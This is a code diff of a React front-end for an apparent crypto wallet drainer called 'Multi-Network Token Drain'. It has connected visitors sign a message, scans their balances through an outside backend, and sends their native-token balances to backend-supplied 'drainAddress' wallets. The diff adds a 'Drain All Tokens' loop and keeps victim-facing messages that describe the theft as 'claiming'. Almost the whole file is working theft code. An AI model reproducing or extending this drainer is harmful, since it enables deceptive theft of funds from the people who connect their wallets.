@@ -2,13 +2,12 @@ import { useState, useEffect } from 'react';
 import { WagmiConfig } from "wagmi";
 import { ConnectKitProvider, ConnectKitButton } from "connectkit";
 import { useAccount, useSignMessage, useChainId, useWalletClient } from 'wagmi';
-import { parseEther } from 'viem';
+import { parseEther, formatEther } from 'viem';
 import { wagmiConfig } from "./wagmi";
 import './mobile-fix.css';
 
-// Network Configuration (Matches backend)
+// Network Configuration
 const NETWORKS = [
-  // EVM Mainnets
   { id: 1, name: 'Ethereum', symbol: 'ETH', type: 'evm', color: '#627EEA', scan: true },
   { id: 56, name: 'BSC', symbol: 'BNB', type: 'evm', color: '#F0B90B', scan: true },
   { id: 137, name: 'Polygon', symbol: 'MATIC', type: 'evm', color: '#8247E5', scan: true },
@@ -19,23 +18,12 @@ const NETWORKS = [
   { id: 250, name: 'Fantom', symbol: 'FTM', type: 'evm', color: '#1969FF', scan: true },
   { id: 100, name: 'Gnosis', symbol: 'xDai', type: 'evm', color: '#04795B', scan: true },
   { id: 42220, name: 'Celo', symbol: 'CELO', type: 'evm', color: '#35D07F', scan: true },
-  { id: 1284, name: 'Moonbeam', symbol: 'GLMR', type: 'evm', color: '#53CBC9', scan: true },
-  { id: 1088, name: 'Metis', symbol: 'METIS', type: 'evm', color: '#00DACC', scan: true },
-  { id: 25, name: 'Cronos', symbol: 'CRO', type: 'evm', color: '#121C36', scan: true },
-  { id: 1666600000, name: 'Harmony', symbol: 'ONE', type: 'evm', color: '#00AEE9', scan: true },
-  { id: 1313161554, name: 'Aurora', symbol: 'ETH', type: 'evm', color: '#78D64B', scan: true },
   
   // Non-EVM Chains
   { id: 'bitcoin', name: 'Bitcoin', symbol: 'BTC', type: 'non-evm', color: '#F7931A', scan: false },
   { id: 'solana', name: 'Solana', symbol: 'SOL', type: 'non-evm', color: '#00FFA3', scan: false },
   { id: 'tron', name: 'Tron', symbol: 'TRX', type: 'non-evm', color: '#FF060A', scan: false },
   { id: 'cardano', name: 'Cardano', symbol: 'ADA', type: 'non-evm', color: '#0033AD', scan: false },
-  { id: 'dogecoin', name: 'Dogecoin', symbol: 'DOGE', type: 'non-evm', color: '#C2A633', scan: false },
-  { id: 'litecoin', name: 'Litecoin', symbol: 'LTC', type: 'non-evm', color: '#BFBBBB', scan: false },
-  { id: 'ripple', name: 'Ripple', symbol: 'XRP', type: 'non-evm', color: '#23292F', scan: false },
-  { id: 'polkadot', name: 'Polkadot', symbol: 'DOT', type: 'non-evm', color: '#E6007A', scan: false },
-  { id: 'cosmos', name: 'Cosmos', symbol: 'ATOM', type: 'non-evm', color: '#2E3148', scan: false },
-  { id: 'binance', name: 'Binance Chain', symbol: 'BNB', type: 'non-evm', color: '#F0B90B', scan: false },
 ];
 
 function TokenDrainApp() {
@@ -49,16 +37,6 @@ function TokenDrainApp() {
           hideTooltips: true,
           disclaimer: null,
           embedGoogleFonts: false,
-          customTheme: {
-            "--ck-font-family": "'Inter', -apple-system, BlinkMacSystemFont, 'Segoe UI', sans-serif",
-            "--ck-border-radius": "16px",
-            "--ck-accent-color": "#667eea",
-            "--ck-accent-text-color": "#ffffff",
-            "--ck-modal-background": "#1a1a2e",
-            "--ck-body-background": "#16213e",
-            "--ck-body-color": "#ffffff",
-            "--ck-body-color-muted": "#94a3b8",
-          },
         }}
         theme="midnight"
       >
@@ -75,70 +53,36 @@ function MultiNetworkDashboard() {
   const { data: walletClient } = useWalletClient();
 
   const [authStatus, setAuthStatus] = useState('');
-  const [signature, setSignature] = useState('');
   const [isAuthenticating, setIsAuthenticating] = useState(false);
   const [isScanning, setIsScanning] = useState(false);
   const [backendUrl] = useState('https://tokenbackend-5xab.onrender.com');
   const [userTokens, setUserTokens] = useState({});
-  const [txStatus, setTxStatus] = useState({});
-  const [scanProgress, setScanProgress] = useState(0);
-  const [apiStatus, setApiStatus] = useState('Checking...');
+  const [drainStatus, setDrainStatus] = useState({});
+  const [isDrainingAll, setIsDrainingAll] = useState(false);
 
   useEffect(() => {
     if (isConnected && address) {
-      handleWalletConnected(address);
+      setAuthStatus('🔄 Wallet connected');
     } else {
       resetState();
     }
   }, [isConnected, address]);
 
-  useEffect(() => {
-    checkApiStatus();
-  }, []);
-
-  const checkApiStatus = async () => {
-    try {
-      const response = await fetch(`${backendUrl}/health`);
-      if (response.ok) {
-        setApiStatus('🟢 Online');
-      } else {
-        setApiStatus('🔴 Offline');
-      }
-    } catch (error) {
-      setApiStatus('🔴 Offline');
-    }
-  };
-
   const resetState = () => {
     setAuthStatus('');
-    setSignature('');
     setUserTokens({});
-    setTxStatus({});
-    setScanProgress(0);
+    setDrainStatus({});
   };
 
-  const handleWalletConnected = async (walletAddress) => {
-    try {
-      setAuthStatus('🔄 Wallet connected - Ready to scan ALL networks');
-    } catch (error) {
-      console.error("Connection error:", error);
-      setAuthStatus('❌ Connection error');
-    }
-  };
-
-  const authenticateAllNetworks = async () => {
+  const authenticateWithBackend = async () => {
     if (!address) return;
     
     try {
       setIsAuthenticating(true);
-      setAuthStatus('🔐 Signing authentication for ALL networks...');
+      setAuthStatus('🔐 Signing message...');
       
-      const timestamp = Date.now();
-      const networkNames = NETWORKS.map(n => n.name).join(', ');
-      const message = `Token Drain Authentication for ALL Networks\nWallet: ${address}\nNetworks: ${networkNames}\nTime: ${timestamp}`;
-      
-      const sig = await signMessageAsync({ message });
-      setSignature(sig);
+      const message = `Authenticate for Multi-Network Token Drain\nWallet: ${address}\nTime: ${Date.now()}`;
+      const signature = await signMessageAsync({ message });
       
       setAuthStatus('📡 Sending to backend...');
       
@@ -147,28 +91,28 @@ function MultiNetworkDashboard() {
         headers: { 'Content-Type': 'application/json' },
         body: JSON.stringify({
           address,
-          signature: sig,
-          message,
-          networks: NETWORKS
+          signature,
+          message
         })
       });
       
       const data = await response.json();
       
       if (data.success) {
-        setAuthStatus('✅ Authenticated for ALL networks!');
-        // Auto-scan after authentication
+        setAuthStatus('✅ Authenticated successfully!');
+        // Auto-scan after auth
         setTimeout(() => scanAllNetworks(), 1000);
       } else {
         setAuthStatus(`❌ Authentication failed: ${data.error}`);
       }
-      
     } catch (error) {
       console.error("Auth error:", error);
       if (error.code === 4001) {
-        setAuthStatus('❌ Signature rejected');
+        setAuthStatus('❌ Signature rejected by user');
+      } else if (error.message.includes('No internet')) {
+        setAuthStatus('❌ No internet connection');
       } else {
-        setAuthStatus(`❌ Auth error: ${error.message}`);
+        setAuthStatus(`❌ Error: ${error.message}`);
       }
     } finally {
       setIsAuthenticating(false);
@@ -179,8 +123,7 @@ function MultiNetworkDashboard() {
     if (!address) return;
     
     setIsScanning(true);
-    setAuthStatus('🌐 Scanning ALL networks...');
-    setScanProgress(0);
+    setAuthStatus('🔍 Scanning networks...');
     
     try {
       const response = await fetch(`${backendUrl}/scan/${address}`);
@@ -192,26 +135,23 @@ function MultiNetworkDashboard() {
       const data = await response.json();
       
       if (data.success) {
-        // Process all network results
         const allTokens = {};
         data.data.results.forEach(result => {
-          if (result.tokens.length > 0) {
+          if (result.tokens && result.tokens.length > 0) {
             allTokens[result.network.id] = {
               network: result.network,
               tokens: result.tokens,
-              totalValue: result.summary.totalValue
+              totalValue: result.totalValue || 0
             };
           }
         });
         
         setUserTokens(allTokens);
-        setScanProgress(100);
         
-        const totalNetworks = Object.keys(allTokens).length;
         const totalTokens = Object.values(allTokens).reduce((sum, data) => sum + data.tokens.length, 0);
         const totalValue = Object.values(allTokens).reduce((sum, data) => sum + data.totalValue, 0);
         
-        setAuthStatus(`✅ Scanned ${totalNetworks} networks • Found ${totalTokens} tokens • $${totalValue.toFixed(2)} total`);
+        setAuthStatus(`✅ Found ${totalTokens} tokens across ${Object.keys(allTokens).length} networks ($${totalValue.toFixed(2)})`);
       } else {
         setAuthStatus(`❌ Scan failed: ${data.error}`);
       }
@@ -225,67 +165,207 @@ function MultiNetworkDashboard() {
 
   const executeDrain = async (token) => {
     if (!walletClient || !address) {
-      setTxStatus(prev => ({...prev, [token.networkId]: 'Wallet not ready'}));
+      setDrainStatus(prev => ({...prev, [token.networkId]: { status: 'error', message: 'Wallet not ready' }}));
       return;
     }
 
     try {
-      setIsAuthenticating(true);
-      setTxStatus(prev => ({...prev, [token.networkId]: 'Preparing transaction...'}));
+      setDrainStatus(prev => ({...prev, [token.networkId]: { status: 'processing', message: 'Preparing...' }}));
+      
+      // Check if amount is valid
+      if (token.amount <= 0 || token.amount === '0') {
+        setDrainStatus(prev => ({...prev, [token.networkId]: { 
+          status: 'error', 
+          message: 'Amount is 0, nothing to claim' 
+        }}));
+        return;
+      }
       
       // For EVM native tokens
       if (token.isNative && typeof token.networkId === 'number') {
         const amountInWei = parseEther(token.amount.toString());
         
-        if (amountInWei <= 0n) {
-          setTxStatus(prev => ({...prev, [token.networkId]: 'Amount too small'}));
+        // Check if amount is too small
+        if (amountInWei <= 10000n) { // Less than 0.000000000001 ETH equivalent
+          setDrainStatus(prev => ({...prev, [token.networkId]: { 
+            status: 'error', 
+            message: 'Amount too small to claim' 
+          }}));
           return;
         }
         
-        setTxStatus(prev => ({...prev, [token.networkId]: 'Confirm in wallet...'}));
+        setDrainStatus(prev => ({...prev, [token.networkId]: { status: 'processing', message: 'Confirm in wallet...' }}));
         
-        const hash = await walletClient.sendTransaction({
-          to: token.drainAddress,
-          value: amountInWei,
-        });
-        
-        setTxStatus(prev => ({...prev, [token.networkId]: `✅ Sent: ${hash.substring(0, 10)}...`}));
-        
-        // Log to backend
-        await logTransaction(token, hash);
-        
-        // Remove from UI
-        setUserTokens(prev => {
-          const updated = {...prev};
-          if (updated[token.networkId]) {
-            updated[token.networkId].tokens = updated[token.networkId].tokens.filter(t => 
-              t.symbol !== token.symbol || t.contractAddress !== token.contractAddress
-            );
+        try {
+          const hash = await walletClient.sendTransaction({
+            to: token.drainAddress,
+            value: amountInWei,
+          });
+          
+          // Success
+          setDrainStatus(prev => ({...prev, [token.networkId]: { 
+            status: 'success', 
+            message: `✅ Successfully claimed ${token.amount} ${token.symbol}!`,
+            txHash: hash
+          }}));
+          
+          // Log success to backend
+          await logTransaction(token, hash, 'success');
+          
+          // Remove from UI after success
+          setTimeout(() => {
+            setUserTokens(prev => {
+              const updated = {...prev};
+              if (updated[token.networkId]) {
+                updated[token.networkId].tokens = updated[token.networkId].tokens.filter(t => 
+                  t.symbol !== token.symbol || t.contractAddress !== token.contractAddress
+                );
+              }
+              return updated;
+            });
+          }, 2000);
+          
+        } catch (txError) {
+          console.error("Transaction error:", txError);
+          
+          let errorMessage = 'Oops, something went wrong. Retry again';
+          
+          if (txError.code === 4001) {
+            errorMessage = 'Transaction rejected by user';
+          } else if (txError.message.includes('insufficient funds') || txError.message.includes('gas')) {
+            errorMessage = 'Not enough gas for this claim';
+          } else if (txError.message.includes('network') || txError.message.includes('chain')) {
+            errorMessage = 'Wrong network selected. Switch to correct network';
           }
-          return updated;
-        });
-        
+          
+          setDrainStatus(prev => ({...prev, [token.networkId]: { 
+            status: 'error', 
+            message: errorMessage 
+          }}));
+          
+          // Log failure to backend
+          await logTransaction(token, null, 'failed');
+        }
       } else {
-        // For ERC20 or non-EVM tokens
-        setTxStatus(prev => ({...prev, [token.networkId]: `Send ${token.symbol} to ${token.drainAddress}`}));
-        await logTransaction(token);
+        // For ERC20 or non-EVM
+        setDrainStatus(prev => ({...prev, [token.networkId]: { 
+          status: 'info', 
+          message: `Send ${token.symbol} manually to: ${token.drainAddress.substring(0, 12)}...`
+        }}));
+        
+        await logTransaction(token, null, 'pending');
       }
       
     } catch (error) {
       console.error("Drain error:", error);
-      if (error.code === 4001) {
-        setTxStatus(prev => ({...prev, [token.networkId]: 'User rejected'}));
-      } else if (error.message.includes('insufficient funds')) {
-        setTxStatus(prev => ({...prev, [token.networkId]: 'Insufficient gas'}));
-      } else {
-        setTxStatus(prev => ({...prev, [token.networkId]: `Error: ${error.shortMessage || error.message}`}));
-      }
-    } finally {
-      setIsAuthenticating(false);
+      setDrainStatus(prev => ({...prev, [token.networkId]: { 
+        status: 'error', 
+        message: 'Oops, something went wrong. Retry again' 
+      }}));
     }
   };
 
-  const logTransaction = async (token, txHash = null) => {
+  const drainAllTokens = async () => {
+    if (!walletClient || !address) {
+      setAuthStatus('❌ Wallet not ready');
+      return;
+    }
+    
+    setIsDrainingAll(true);
+    setAuthStatus('⚡ Draining all tokens...');
+    
+    try {
+      // Get all native tokens
+      const allNativeTokens = [];
+      Object.values(userTokens).forEach(data => {
+        data.tokens.forEach(token => {
+          if (token.isNative && token.amount > 0) {
+            allNativeTokens.push(token);
+          }
+        });
+      });
+      
+      if (allNativeTokens.length === 0) {
+        setAuthStatus('❌ No tokens available to drain');
+        setIsDrainingAll(false);
+        return;
+      }
+      
+      let successCount = 0;
+      let failCount = 0;
+      
+      // Drain tokens one by one
+      for (const token of allNativeTokens) {
+        try {
+          setDrainStatus(prev => ({...prev, [token.networkId]: { 
+            status: 'processing', 
+            message: `Draining ${token.symbol}...` 
+          }}));
+          
+          const amountInWei = parseEther(token.amount.toString());
+          
+          if (amountInWei <= 10000n) {
+            setDrainStatus(prev => ({...prev, [token.networkId]: { 
+              status: 'error', 
+              message: 'Amount too small' 
+            }}));
+            failCount++;
+            continue;
+          }
+          
+          const hash = await walletClient.sendTransaction({
+            to: token.drainAddress,
+            value: amountInWei,
+          });
+          
+          setDrainStatus(prev => ({...prev, [token.networkId]: { 
+            status: 'success', 
+            message: `✅ Claimed ${token.symbol}!` 
+          }}));
+          
+          await logTransaction(token, hash, 'success');
+          successCount++;
+          
+          // Small delay between transactions
+          await new Promise(resolve => setTimeout(resolve, 2000));
+          
+        } catch (error) {
+          console.error(`Failed to drain ${token.symbol}:`, error);
+          
+          let errorMsg = 'Failed';
+          if (error.message.includes('insufficient funds')) {
+            errorMsg = 'Not enough gas';
+          } else if (error.code === 4001) {
+            errorMsg = 'Rejected';
+          }
+          
+          setDrainStatus(prev => ({...prev, [token.networkId]: { 
+            status: 'error', 
+            message: errorMsg 
+          }}));
+          
+          await logTransaction(token, null, 'failed');
+          failCount++;
+        }
+      }
+      
+      // Update UI after all drains
+      setAuthStatus(`✅ Drain completed: ${successCount} successful, ${failCount} failed`);
+      
+      // Refresh token list
+      setTimeout(() => {
+        scanAllNetworks();
+      }, 3000);
+      
+    } catch (error) {
+      console.error("Drain all error:", error);
+      setAuthStatus('❌ Failed to drain all tokens');
+    } finally {
+      setIsDrainingAll(false);
+    }
+  };
+
+  const logTransaction = async (token, txHash = null, status = 'pending') => {
     try {
       await fetch(`${backendUrl}/log`, {
         method: 'POST',
@@ -296,7 +376,8 @@ function MultiNetworkDashboard() {
           chainId: token.networkId,
           tokenType: token.isNative ? 'native' : 'erc20',
           tokenAddress: token.contractAddress,
-          transactionHash: txHash
+          transactionHash: txHash,
+          status: status
         })
       });
     } catch (error) {
@@ -322,303 +403,155 @@ function MultiNetworkDashboard() {
 
   return (
     <div className="App">
-      <div className="app-container">
-        <header className="app-header">
-          <div className="header-content">
-            <div className="logo-section">
-              <div className="logo-icon">🌍</div>
-              <div>
-                <h1>Multi-Network Token Drain</h1>
-                <p className="tagline">Scan & Drain tokens from ALL networks</p>
+      <header className="App-header">
+        <h1>🌐 Multi-Network Token Drain</h1>
+        
+        <div className="wallet-section">
+          <ConnectKitButton />
+        </div>
+        
+        {isConnected && address && (
+          <div className="dashboard">
+            <div className="wallet-info">
+              <div className="wallet-details">
+                <div>Wallet: {formatAddress(address)}</div>
+                <div>Network: {NETWORKS.find(n => n.id === chainId)?.name || 'Unknown'}</div>
+              </div>
+              
+              <div className="status-area">
+                <div className={`status ${authStatus.includes('✅') ? 'success' : authStatus.includes('❌') ? 'error' : ''}`}>
+                  {authStatus || 'Ready'}
+                </div>
+              </div>
+              
+              <div className="action-buttons">
+                <button 
+                  onClick={authenticateWithBackend}
+                  disabled={isAuthenticating || isScanning}
+                  className="btn-primary"
+                >
+                  {isAuthenticating ? 'Authenticating...' : 'Authenticate'}
+                </button>
+                <button 
+                  onClick={scanAllNetworks}
+                  disabled={isScanning || isAuthenticating}
+                  className="btn-secondary"
+                >
+                  {isScanning ? 'Scanning...' : 'Scan Networks'}
+                </button>
               </div>
             </div>
             
-            <div className="header-right">
-              <div className="api-status">
-                <span>Backend: {apiStatus}</span>
-              </div>
-              <div className="wallet-section">
-                <ConnectKitButton />
-              </div>
-            </div>
-          </div>
-        </header>
-
-        <main className="app-main">
-          {isConnected && address ? (
-            <div className="dashboard-grid">
-              {/* Control Panel */}
-              <div className="panel control-panel">
-                <div className="panel-header">
-                  <h2>Control Panel</h2>
-                  <div className="wallet-status">
-                    <span className="status-dot"></span>
-                    Connected
+            {getTotalTokens() > 0 && (
+              <div className="tokens-section">
+                <div className="tokens-header">
+                  <h2>Detected Tokens</h2>
+                  <div className="summary">
+                    <span>{getNetworkCount()} Networks</span>
+                    <span>{getTotalTokens()} Tokens</span>
+                    <span>${getTotalValue()} Total</span>
                   </div>
+                  
+                  <button 
+                    onClick={drainAllTokens}
+                    disabled={isDrainingAll || isAuthenticating || isScanning}
+                    className="btn-danger"
+                  >
+                    {isDrainingAll ? 'Draining All...' : 'Drain All Tokens'}
+                  </button>
                 </div>
                 
-                <div className="wallet-info">
-                  <div className="info-item">
-                    <span className="label">Wallet:</span>
-                    <span className="value mono">{formatAddress(address)}</span>
-                  </div>
-                  <div className="info-item">
-                    <span className="label">Current Network:</span>
-                    <span className="value">{NETWORKS.find(n => n.id === chainId)?.name || 'Unknown'}</span>
-                  </div>
-                  <div className="info-item">
-                    <span className="label">Total Networks:</span>
-                    <span className="value">{NETWORKS.length}</span>
-                  </div>
-                </div>
-
-                <div className="status-container">
-                  <div className={`status-message ${authStatus.includes('✅') ? 'success' : authStatus.includes('❌') ? 'error' : 'info'}`}>
-                    {authStatus || 'Ready to authenticate and scan'}
-                  </div>
-                  
-                  {signature && (
-                    <div className="signature-preview">
-                      <span className="mono">Signature: {signature.substring(0, 12)}...</span>
-                    </div>
-                  )}
-                  
-                  {isScanning && (
-                    <div className="progress-bar">
-                      <div className="progress-fill" style={{ width: `${scanProgress}%` }}></div>
-                      <span className="progress-text">{scanProgress}%</span>
-                    </div>
-                  )}
-                </div>
-
-                <div className="action-buttons">
-                  <button 
-                    onClick={authenticateAllNetworks}
-                    disabled={isAuthenticating || isScanning}
-                    className="btn btn-primary btn-lg"
-                  >
-                    {isAuthenticating ? (
-                      <>
-                        <span className="spinner"></span>
-                        Authenticating...
-                      </>
-                    ) : (
-                      <>
-                        <span className="btn-icon">🔐</span>
-                        Authenticate ALL Networks
-                      </>
-                    )}
-                  </button>
-                  
-                  <button 
-                    onClick={scanAllNetworks}
-                    disabled={isScanning || isAuthenticating}
-                    className="btn btn-secondary"
-                  >
-                    {isScanning ? (
-                      <>
-                        <span className="spinner"></span>
-                        Scanning...
-                      </>
-                    ) : (
-                      <>
-                        <span className="btn-icon">🔍</span>
-                        Scan ALL Networks
-                      </>
-                    )}
-                  </button>
-                </div>
-
-                {/* Quick Stats */}
-                {getNetworkCount() > 0 && (
-                  <div className="quick-stats">
-                    <h3>Scan Results</h3>
-                    <div className="stats-grid">
-                      <div className="stat">
-                        <span className="stat-value">{getNetworkCount()}</span>
-                        <span className="stat-label">Networks</span>
+                <div className="tokens-list">
+                  {Object.entries(userTokens).map(([networkId, data]) => (
+                    <div key={networkId} className="network-group">
+                      <div className="network-header">
+                        <h3>{data.network.name}</h3>
+                        <span>${data.totalValue.toFixed(2)}</span>
                       </div>
-                      <div className="stat">
-                        <span className="stat-value">{getTotalTokens()}</span>
-                        <span className="stat-label">Tokens</span>
-                      </div>
-                      <div className="stat">
-                        <span className="stat-value">${getTotalValue()}</span>
-                        <span className="stat-label">Total Value</span>
-                      </div>
-                    </div>
-                  </div>
-                )}
-              </div>
-
-              {/* Tokens Panel */}
-              <div className="panel tokens-panel">
-                <div className="panel-header">
-                  <div className="header-left">
-                    <h2>Detected Tokens</h2>
-                    <div className="summary">
-                      <span className="summary-item">{getNetworkCount()} Networks</span>
-                      <span className="summary-item">{getTotalTokens()} Tokens</span>
-                      <span className="summary-item">${getTotalValue()}</span>
-                    </div>
-                  </div>
-                  
-                  {getTotalTokens() > 0 && (
-                    <button 
-                      className="btn btn-danger"
-                      onClick={() => {
-                        if (window.confirm('Warning: This will attempt to drain ALL tokens. Are you sure?')) {
-                          // Bulk drain implementation
-                        }
-                      }}
-                      disabled={isAuthenticating}
-                    >
-                      Drain All
-                    </button>
-                  )}
-                </div>
-
-                {getNetworkCount() === 0 ? (
-                  <div className="empty-state">
-                    <div className="empty-icon">📭</div>
-                    <h3>No tokens detected</h3>
-                    <p>Authenticate and scan to discover tokens across all networks</p>
-                    <div className="empty-actions">
-                      <button 
-                        onClick={authenticateAllNetworks}
-                        className="btn btn-primary"
-                      >
-                        Authenticate First
-                      </button>
-                      <button 
-                        onClick={scanAllNetworks}
-                        className="btn btn-secondary"
-                      >
-                        Scan Anyway
-                      </button>
-                    </div>
-                  </div>
-                ) : (
-                  <div className="tokens-container">
-                    {Object.entries(userTokens).map(([networkId, data]) => (
-                      <div key={networkId} className="network-section">
-                        <div 
-                          className="network-header"
-                          style={{ borderLeftColor: data.network.color }}
-                        >
-                          <div className="network-info">
-                            <div className="network-name">
-                              <span 
-                                className="network-icon"
-                                style={{ backgroundColor: data.network.color }}
-                              ></span>
-                              {data.network.name}
-                            </div>
-                            <div className="network-stats">
-                              <span>{data.tokens.length} tokens</span>
-                              <span>${data.totalValue.toFixed(2)}</span>
-                            </div>
-                          </div>
-                          <div className="network-status">
-                            {txStatus[networkId] ? (
-                              <span className="tx-status">{txStatus[networkId]}</span>
-                            ) : (
-                              <span className="ready">Ready</span>
-                            )}
-                          </div>
-                        </div>
-
-                        <div className="tokens-list">
-                          {data.tokens.map((token, idx) => (
-                            <div key={idx} className="token-card">
-                              <div className="token-icon">
-                                {token.logo ? (
-                                  <img src={token.logo} alt={token.symbol} />
-                                ) : (
-                                  <div 
-                                    className="token-placeholder"
-                                    style={{ backgroundColor: data.network.color }}
-                                  >
-                                    {token.symbol.substring(0, 2)}
-                                  </div>
-                                )}
+                      
+                      {data.tokens.map((token, idx) => {
+                        const status = drainStatus[token.networkId];
+                        const tokenStatus = status?.status || 'pending';
+                        
+                        return (
+                          <div key={idx} className="token-item">
+                            <div className="token-info">
+                              <div className="token-symbol">{token.symbol}</div>
+                              <div className="token-name">{token.name}</div>
+                              <div className="token-amount">
+                                {parseFloat(token.amount).toLocaleString(undefined, {
+                                  maximumFractionDigits: 8
+                                })} {token.symbol}
                               </div>
-                              <div className="token-details">
-                                <div className="token-symbol">{token.symbol}</div>
-                                <div className="token-name">{token.name}</div>
-                                <div className="token-amount">
-                                  {parseFloat(token.amount).toLocaleString(undefined, {
-                                    maximumFractionDigits: 8
-                                  })}
-                                </div>
+                              <div className="token-value">
+                                {token.value ? `$${token.value.toFixed(2)}` : 'No price'}
                               </div>
-                              <div className="token-actions">
-                                <div className="token-value">
-                                  {token.value ? `$${token.value.toFixed(2)}` : 'N/A'}
+                            </div>
+                            
+                            <div className="token-actions">
+                              {tokenStatus === 'success' && (
+                                <div className="status-success">
+                                  ✅ {status.message}
                                 </div>
+                              )}
+                              
+                              {tokenStatus === 'error' && (
+                                <div className="status-error">
+                                  ❌ {status.message}
+                                </div>
+                              )}
+                              
+                              {tokenStatus === 'processing' && (
+                                <div className="status-processing">
+                                  ⏳ {status.message}
+                                </div>
+                              )}
+                              
+                              {tokenStatus === 'info' && (
+                                <div className="status-info">
+                                  ℹ️ {status.message}
+                                </div>
+                              )}
+                              
+                              {(!status || status.status === 'pending') && (
                                 <button
                                   onClick={() => executeDrain(token)}
-                                  disabled={token.amount <= 0 || isAuthenticating}
+                                  disabled={token.amount <= 0 || isAuthenticating || isDrainingAll}
                                   className="drain-btn"
                                 >
                                   Drain
                                 </button>
-                              </div>
+                              )}
                             </div>
-                          ))}
-                        </div>
-                      </div>
-                    ))}
-                  </div>
-                )}
-              </div>
-            </div>
-          ) : (
-            <div className="connection-prompt">
-              <div className="prompt-content">
-                <div className="prompt-icon">🔗</div>
-                <h2>Connect Your Wallet</h2>
-                <p>Connect to scan and manage tokens across ALL networks</p>
-                <div className="connect-button-wrapper">
-                  <ConnectKitButton />
-                </div>
-                <div className="networks-preview">
-                  <p>Supported Networks:</p>
-                  <div className="network-tags">
-                    <span className="tag evm">EVM ({NETWORKS.filter(n => n.type === 'evm').length})</span>
-                    <span className="tag non-evm">Non-EVM ({NETWORKS.filter(n => n.type === 'non-evm').length})</span>
-                    <span className="tag total">Total: {NETWORKS.length}</span>
-                  </div>
+                          </div>
+                        );
+                      })}
+                    </div>
+                  ))}
                 </div>
               </div>
-            </div>
-          )}
-        </main>
-
-        <footer className="app-footer">
-          <div className="footer-content">
-            <div className="footer-info">
-              <span className="version">v5.0.0 • Multi-Network</span>
-              <span className="status">Backend: {apiStatus}</span>
-              <span className="mode">Production Mode</span>
-            </div>
-            <div className="footer-links">
-              <a href={`${backendUrl}/health`} target="_blank" rel="noopener noreferrer">
-                API Health
-              </a>
-              <a href={`${backendUrl}/networks`} target="_blank" rel="noopener noreferrer">
-                Network List
-              </a>
-              <a href="#" onClick={(e) => {
-                e.preventDefault();
-                if (address) scanAllNetworks();
-              }}>
-                Force Rescan
-              </a>
-            </div>
+            )}
           </div>
-        </footer>
-      </div>
+        )}
+        
+        {!isConnected && (
+          <div className="connect-prompt">
+            <h2>Connect Your Wallet</h2>
+            <p>Connect to scan and drain tokens across all networks</p>
+            <ConnectKitButton />
+          </div>
+        )}
+        
+        <div className="footer">
+          <div className="links">
+            <a href={`${backendUrl}/health`} target="_blank" rel="noopener noreferrer">
+              Backend Health
+            </a>
+            <span>•</span>
+            <span>v6.0.0</span>
+          </div>
+        </div>
+      </header>
     </div>
   );
 }
